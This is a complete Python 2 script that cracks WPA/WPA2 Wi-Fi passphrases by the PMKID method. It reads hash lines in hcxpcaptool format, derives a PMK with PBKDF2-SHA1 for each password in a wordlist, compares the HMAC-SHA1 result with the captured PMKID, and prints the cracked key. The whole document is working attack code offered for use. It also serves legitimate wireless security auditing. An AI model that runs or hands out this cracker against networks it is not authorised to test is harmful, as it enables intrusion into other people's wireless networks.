#!/usr/bin/env python
import sys
from hashlib import pbkdf2_hmac, sha1
import argparse
import datetime
from multiprocessing import Process

print ("running...\n")

start = datetime.datetime.now()

def to_brute(pmkid, essid, msg):
    with open(wordlist) as w:
        for line in w:
            line = line.strip()
            if (len(line) <= 7):
                continue
            
            # pbkdf2_gen
            pmk = (pbkdf2_hmac(hash_name='sha1', password=line,salt=essid,iterations=4096,dklen=32))

            # hmac-sha1_gen end compare
            trans_5C = "".join(chr(x ^ 0x5c) for x in xrange(256))
            trans_36 = "".join(chr(x ^ 0x36) for x in xrange(256))
            blocksize = sha1().block_size
            len(pmk) > blocksize
            pmk += chr(0) * (blocksize - len(pmk))
            o_key_pad = pmk.translate(trans_5C)
            i_key_pad = pmk.translate(trans_36)
            #compare hmac-sha1 with PMKID, if match show result end kill child process. 
            if (sha1(o_key_pad + sha1(i_key_pad + msg).digest()).hexdigest()[:32]) == pmkid:
            
                end = datetime.datetime.now()
                elapsed = end - start                

                print ("[!] Cracked!!! BSSID...: " + essid + "\n               PSK...: " + line + "\n               Time elapsed...: " + str(elapsed)[:-3] + "\n" )

                sys.exit()


parser = argparse.ArgumentParser()
parser.add_argument('-z', action='store', dest='hash_file', help='hcxpcaptool -z file')
parser.add_argument('-w', action='store', dest='wordlist_file', help='wordlist file')
results = parser.parse_args()

hash_file = results.hash_file
wordlist = results.wordlist_file

if __name__ == '__main__':
    try:
        wf = open(wordlist, 'r')
    except IOError:
        print ('[!] I cannot load this file: "'+wordlist+'"!')
        sys.exit()
    if hash_file is not None:
        try:
            to_crack = [line.strip()
            for line in open(hash_file)]
        except IOError:
            print ('[!] I cannot load this file: "'+hash_file+'"!')
            sys.exit()

        #Creates processes for each hash
        for hashes in to_crack:
            hcl = hashes.strip().split('*')
            pmkid = (hcl[0])
            macAp = (hcl[ 1] )
            macCli = (hcl[2])
            essid = (hcl[3]).decode('hex')
            msg = ("504d4b204e616d65"+macAp+macCli).decode("hex")# Atom's magic numbers :)

            mp = Process(target=to_brute, args=(pmkid, essid, msg))
            mp.start()